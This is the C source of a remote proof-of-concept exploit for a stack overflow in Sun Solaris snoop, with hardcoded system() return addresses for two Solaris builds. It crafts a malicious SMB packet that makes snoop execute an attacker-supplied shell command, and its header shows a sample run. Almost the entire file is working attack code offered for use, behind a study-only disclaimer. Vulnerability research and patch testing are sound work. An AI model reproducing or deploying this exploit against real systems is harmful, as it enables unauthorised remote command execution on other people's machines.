/***********************************************************
 * hoagie_snoop.c
 * SUN SOLARIS SNOOP REMOTE EXPLOIT
 * + Sun Solaris 8/9/10
 * + OpenSolaris < snv_96
 *
 * Bug discovered by Gael Delalleau
 * http://www.securityfocus.com/bid/30556
 *
 * attack:/exploits# ./hoagie_snoop -t 192.168.0.1
 * hoagie_snoop.c - solaris snoop remote
 * -andi / void.at
 *
 * [*] attacking 'SunOS opensolaris 5.11 snv_86 i86pc i386 i86pc' on '192.168.0.1' ...
 * [*] execute 'uname -a > /tmp/.patch.your.system.txt' now ...
 * [*] done
 * attack:/exploits#
 *
 * admin@opensolaris:~# snoop port 445
 * Using device pcn0 (promiscuous mode)
 * sh[1]: .ANoN?$(C)+(BSMBr: not found [No such file or directory]
 * WARNING: received signal 11 from packet 1
 * ^Cadmin@opensolaris:~# cat /tmp/.patch.your.system.txt
 * SunOS opensolaris 5.11 snv_86 i86pc i386 i86pc Solaris 
 * admin@opensolaris:~#
 *
 * !!!UND IMMER DEINE FREUNDE, IHR NEHMT DOCH ALLE DROGEN!!!
 *
 * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
 * CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
 * DAMAGE DONE USING THIS PROGRAM.
 *
 * VOID.AT Security
 * andi@void.at
 * http://www.void.at
 *
 ************************************************************/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#define MAX_PACKET              4096
#define SMB_COMMAND_TRIGGER     0x72
#define SMB_PORT_DEFAULT        445
#define SMB_TARGET_DEFAULT      "127.0.0.1"
#define SMB_HEADER_FILLER       0x20

struct target_t {
   char *description;
   int  address;
} targets [] = {
   {
      /* -r-xr-xr-x 1 root bin 580460 2008-04-27 03:51 /usr/sbin/snoop */
      "SunOS 5.11 snv_86 i86pc i386",
      /* system() address */
      0xd2adc2a0
   },

   {
      /* -r-xr-xr-x   1 root     bin       529956 Nov 13  2006 /usr/sbin/snoop */
      "SunOS 5.10 Generic_118833-33 sun4u sparc",
      /* system() address */
      0xff1a7c00
   },

   {
      NULL,
      0,
   }
};

/* usage
 * display help screen
 */
void usage(int argc, char **argv) {
   int i;

   printf("usage: %s [-i <id>] [-t <host>] [-c <command>]\n"
          "\n"
          "-i        id for target\n"
          "-t        host running snoop\n"
          "-c        command to execute\n"
          "\n\n"
          "available ids:\n"
          ,
          argv[0]);
   for (i = 0; targets[i].description != NULL; i++) {
      printf("%2d : %s\n", i, targets[i].description);
   }
   exit(1);           
}

/* create_smb_packet
 */
void send_smb_packet(int s,
                     struct sockaddr_in *sin,
                     char smbcommand,
                     char *content) {

   char *packet = (char*)malloc(MAX_PACKET);
   int length = 0;
   struct tcphdr *tcp;
   char *data;
   int r;

   if (packet) {
      memset(packet, 0, MAX_PACKET);

      tcp = (struct tcphdr*)packet;
      tcp->source = sin->sin_port;
      tcp->dest = sin->sin_port;
      tcp->doff = sizeof(struct tcphdr) / 4;
      tcp->ack = 1;
      tcp->psh = 1;
      tcp->window = htons(32768);

      data = packet + sizeof(struct tcphdr);

      length = 4;

      strcpy(data + length, "\xffSMB");
      length += 4;

      /* smb command */
      data[length++] = smbcommand;

      /* status */
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;

      /* flags */
      data[length++] = 0x18;

      /* flags2 */
      data[length++] = 0x80;
      data[length++] = 0x01;

      /* extra field */
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;

      /* tid */
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;

      /* client process id */
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;

      /* uid */
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;

      /* mid */
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;

      /* word count */
      data[length++] = SMB_HEADER_FILLER;

      /* byte count */
      data[length++] = strlen(content) & 0xff;
      data[length++] = (strlen(content) >> 8) & 0xff;

      data[length++] = 0x02;

      if (content) {
         /* content */
         strcpy(data + length, content);
         length += strlen(content);
      }
      data[length++] = 0x00;

      /* set length for smb data */
      data[3] = (length - 4) & 0xff;
      data[2] = ((length - 4) >> 8) & 0xff;

      /* send packet */
      r = sendto(s, packet, sizeof(struct tcphdr) + length, 0,
                 (struct sockaddr*)sin, sizeof(struct sockaddr_in));
   }

}

/* main entry
 */
int main(int argc, char **argv) {
   char c;
   char *target = SMB_TARGET_DEFAULT;
   int port = SMB_PORT_DEFAULT;
   int s = 0;
   struct sockaddr_in sin;
   int i = 0;
   char buffer[1024];
   int idx = 0;
   char *command = NULL;

   printf("hoagie_snoop.c - solaris snoop remote\n"
          "-andi / void.at\n\n");

   if (argc < 2) {
      usage(argc, argv);
   } else {
      while ((c = getopt (argc, argv, "hvt:p:r:i:c:")) != EOF) {
         switch (c) {
            case 't':
                 target = optarg;
                 break;
            case 'p':
                 port = atoi(optarg);
                 break;
            case 'i':
                 idx = atoi(optarg);
                 break;
            case 'c':
                 command = optarg;
                 break;
            default:
                 printf("[*] unknown command line option '%c'\n", c);
                 exit(-1);
         }
      }
   }

   s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
   if (s == -1) {
      printf("[*] failed to create raw socket\n");
   } else {
      sin.sin_family = AF_INET;
      sin.sin_port = htons(port);
      sin.sin_addr.s_addr = inet_addr(target);
   
      if (!command) {
         command = "uname -a > /tmp/.patch.your.system.txt";
      }
   
      printf("[*] attacking '%s' on '%s' ...\n", targets[idx].description, target);
   
      snprintf(buffer, sizeof(buffer), ";%s;", command);
    
      /* char dialect[256] */
      for (i = strlen(buffer); i < 256; i++) { buffer[i] = SMB_HEADER_FILLER; }
   
      /* int bytecount */
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
   
      /* int length */
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
   
      /* dummy address */
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
   
      /* framepointer / ebp */
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
   
      /* return address */
      buffer[i++] = targets[idx].address & 0xff;
      buffer[i++] = (targets[idx].address >> 8) & 0xff;
      buffer[i++] = (targets[idx].address >> 16) & 0xff;
      buffer[i++] = (targets[idx].address >> 24) & 0xff;
   
      printf("[*] execute '%s' now ...\n", command);
   
      send_smb_packet(s, &sin, SMB_COMMAND_TRIGGER, buffer);
   
      printf("[*] done\n");
          
      close(s);
   }

   return 0;
}
